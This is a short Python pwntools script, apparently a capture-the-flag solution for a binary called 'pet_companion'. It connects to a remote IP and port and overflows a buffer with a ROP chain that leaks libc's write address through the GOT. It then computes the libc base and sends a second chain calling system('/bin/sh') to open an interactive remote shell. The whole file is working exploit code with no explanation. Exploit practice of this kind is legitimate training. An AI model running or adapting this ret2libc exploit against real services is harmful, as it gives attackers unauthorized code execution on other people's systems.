from pwn import *

r = remote('83.136.255.150',33675)

libc = ELF('./glibc/libc.so.6')
elf = ELF('./pet_companion')

main = elf.symbols[b'main']
offset = b'A' * 72
pop_rdi = p64(0x400743)
pop_rsi = p64(0x400741)
write_got = p64(0x600fd8)
write_plt = p64(0x4004f0)

pay = offset + pop_rdi + p64(0x1) + pop_rsi + write_got + p64(0x0) + write_plt + p64(main)

r.sendlineafter(b'status: ', pay)

for i in range(3):
    r.recvline()
    
leak = r.recvline().strip()[:6]
leak = u64(leak.ljust(8, b"\x00"))
print(hex(leak))

base = leak - libc.symbols[b'write']
log.info("Leaked server's libc address: " + hex(base))
libc.address = base

pay = offset + pop_rdi + p64(next(libc.search(b"/bin/sh"))) + p64(libc.sym[b"system"])

r.sendlineafter(b'status: ', pay)

r.interactive()
